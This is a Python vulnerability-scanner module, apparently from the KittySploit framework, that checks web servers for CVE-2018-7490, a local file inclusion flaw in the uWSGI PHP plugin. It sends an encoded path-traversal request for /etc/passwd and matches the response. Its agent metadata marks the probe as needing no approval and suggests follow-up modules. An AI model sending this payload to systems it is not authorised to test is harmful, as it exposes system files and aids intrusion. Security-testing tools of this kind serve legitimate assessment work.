#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""uWSGI PHP Plugin before 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'uWSGI PHP Plugin Local File Inclusion Detection',
        'description': 'uWSGI PHP Plugin before 2.0.17 mishandles a DOCUMENT_ROOT check during use of the --php-docroot option, making it susceptible to local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'uwsgi', 'php', 'lfi', 'plugin', 'edb', 'unbit', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://uwsgi-docs.readthedocs.io/en/latest/Changelog-2.0.17.html',
            'https://www.exploit-db.com/exploits/44223/',
            'https://www.debian.org/security/2018/dsa-4142',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-7490',
            'https://github.com/jweny/pocassistdb',
        ],
        'cve': 'CVE-2018-7490',
    }

    def run(self):
        r = self.http_request(method="GET", path='/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="uWSGI PHP Plugin Local File Inclusion detected",
                path='/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',
            )
            return True
        return False

